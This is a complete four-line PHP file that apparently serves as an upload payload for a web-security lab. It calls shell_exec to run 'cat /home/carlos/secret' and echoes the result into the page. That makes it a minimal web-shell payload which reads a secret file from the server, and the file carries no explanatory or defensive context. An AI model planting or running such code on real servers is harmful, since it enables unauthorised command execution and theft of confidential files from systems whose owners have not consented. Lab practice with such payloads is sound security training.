<?php
$output = shell_exec('cat /home/carlos/secret 2>&1');
echo "<pre>$output</pre>";
?>